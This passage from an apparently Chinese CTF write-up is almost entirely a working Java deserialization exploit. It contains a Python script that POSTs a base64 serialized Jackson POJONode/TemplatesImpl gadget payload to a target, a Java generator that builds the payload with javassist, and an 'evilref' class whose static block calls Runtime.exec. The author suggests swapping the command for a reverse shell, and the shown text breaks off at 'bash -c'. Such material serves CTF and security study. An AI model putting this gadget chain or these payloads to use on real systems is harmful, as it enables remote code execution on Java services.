参数是直接获取 body 的，不带键。<br>hackbar 搞不定，用 python 浅浅发送一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:2222/Hello/eyIiOnRydWUsImJhc2U2NENvZGUiOiJBQUFBQUFBQSJ9&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;param&quot;</span>:<span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAKHQAA2V4cHQACGV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB%2BABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA%2F%2F%2F%2F%2F3VyAANbW0JL%2FRkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF%2FgGCFTgAgAAeHAAAAYOyv66vgAAADQANQoACAAlCgAmACcIACgKACYAKQcAKgoABQArBwAsBwAtAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMZXZpbHJlZjsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALgEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ%2BAQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACoBAApTb3VyY2VGaWxlAQAMZXZpbHJlZi5qYXZhDAAJAAoHAC8MADAAMQEABGNhbGMMADIAMwEAE2phdmEvaW8vSU9FeGNlcHRpb24MADQACgEAB2V2aWxyZWYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAkADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAwALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABYADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAGAAAAAkCABIAAAAUAAAAAQAQABkAAwALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAABsADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAaABsAAgAAAAEAHAAdAAMAFgAAAAQAAQAXABgAAAANAwASAAAAGgAAABwAAAAIAB4ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAA0ACQAQAAwADgANAA8AEQARAA0AAAAMAAEADQAEAB8AIAAAACEAAAAHAAJMBwAiBAABACMAAAACACRwdAAHc2hhbmdoZXB3AQB4&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#string2 = <span class="string">&quot;rO0ABXNyADZzY2FsYS5jb2xsZWN0aW9uLmltbXV0YWJsZS5MYXp5TGlzdCRTZXJpYWxpemF0aW9uUHJveHkAAAAAAAAAAwMAAHhwc3IAJnNjYWxhLnJ1bnRpbWUuTW9kdWxlU2VyaWFsaXphdGlvblByb3h5AAAAAAAAAAECAAFMAAttb2R1bGVDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7eHB2cgAmc2NhbGEuY29sbGVjdGlvbi5nZW5lcmljLlNlcmlhbGl6ZUVuZCQAAAAAAAAAAwIAAHhwc3IAI3NjYWxhLmNvbGxlY3Rpb24uaW1tdXRhYmxlLkxhenlMaXN0AAAAAAAAAAMDAAVaAAhiaXRtYXAkMFoADW1pZEV2YWx1YXRpb25aADNzY2FsYSRjb2xsZWN0aW9uJGltbXV0YWJsZSRMYXp5TGlzdCQkc3RhdGVFdmFsdWF0ZWRMAAlsYXp5U3RhdGV0ABFMc2NhbGEvRnVuY3Rpb24wO0wAKnNjYWxhJGNvbGxlY3Rpb24kaW1tdXRhYmxlJExhenlMaXN0JCRzdGF0ZXQAK0xzY2FsYS9jb2xsZWN0aW9uL2ltbXV0YWJsZS9MYXp5TGlzdCRTdGF0ZTt4cAAAAXNyAExzY2FsYS5zeXMucHJvY2Vzcy5Qcm9jZXNzQnVpbGRlckltcGwkRmlsZU91dHB1dCQkYW5vbmZ1biQkbGVzc2luaXQkZ3JlYXRlciQzAAAAAAAAAAACAAJaAAhhcHBlbmQkMUwABmZpbGUkMnQADkxqYXZhL2lvL0ZpbGU7eHAAc3IADGphdmEuaW8uRmlsZQQtpEUODeT/AwABTAAEcGF0aHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAYLi9zZWN1cml0eS9ibGFja2xpc3QudHh0dwIAL3hzcQB+AAJ2cgAwc2NhbGEuY29sbGVjdGlvbi5pbW11dGFibGUuTGF6eUxpc3QkU3RhdGUkRW1wdHkkAAAAAAAAAAMCAAB4cHh4&quot;</span></span><br><span class="line">string = <span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAKHQAA2V4cHQACGV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAYOyv66vgAAADQANQoACAAlCgAmACcIACgKACYAKQcAKgoABQArBwAsBwAtAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMZXZpbHJlZjsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALgEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACoBAApTb3VyY2VGaWxlAQAMZXZpbHJlZi5qYXZhDAAJAAoHAC8MADAAMQEABGNhbGMMADIAMwEAE2phdmEvaW8vSU9FeGNlcHRpb24MADQACgEAB2V2aWxyZWYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAkADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAwALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABYADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAGAAAAAkCABIAAAAUAAAAAQAQABkAAwALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAABsADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAaABsAAgAAAAEAHAAdAAMAFgAAAAQAAQAXABgAAAANAwASAAAAGgAAABwAAAAIAB4ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAA0ACQAQAAwADgANAA8AEQARAA0AAAAMAAEADQAEAB8AIAAAACEAAAAHAAJMBwAiBAABACMAAAACACRwdAAHc2hhbmdoZXB3AQB4&quot;</span></span><br><span class="line">res =requests.post(url=url,data=string)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h2 id="坑点"><span id="坑点"> 坑点</span></h2><p>参考：<a href="https://boogipop.com/2023/04/24/AliyunCTF%202023%20WriteUP/">https://boogipop.com/2023/04/24/AliyunCTF%202023%20WriteUP/</a><br> 我也算是比较火星了，这个坑点在 aliyun 的时候就已经有师傅作了分析，但是那时候我还不会 java，压根做不动一道题，放弃了，结果这次出现了，算了，趁这次解决一下吧。</p><p>就是如果直接用题目的包的话，一定会无法序列化，会报错。<br>会指出空指针错误，原因就在 writeReplace 这里，序列化的时候会调用父类 writeReplace 方法，而没有正常去序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> NodeSerialization.from(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以要删掉这个方法，由于改 jar 包过于麻烦，<br>我们直接在本地起个一模一样的类，<br>创个一样的包，将类的内容全部复制过来，然后把这个方法删去，就可以正常序列化了。</p><h2 id="aliyunbapassit"><span id="aliyunbapassit"> aliyunbapassit</span></h2><p>直接拿上面的 payload 打：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(evilref.class.getName());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = ctClass.toBytecode();</span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]&#123;code&#125;;</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        ref(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;shanghe&quot;</span>);</span><br><span class="line">        ref(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;这是要写入文件的字符串内容&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">                writer.write(args);</span><br><span class="line">                writer.close();</span><br><span class="line">                System.out.println(<span class="string">&quot;字符串已成功写入文件。&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;写入文件时发生错误：&quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>命令执行改成反弹 shell 就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilref</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c 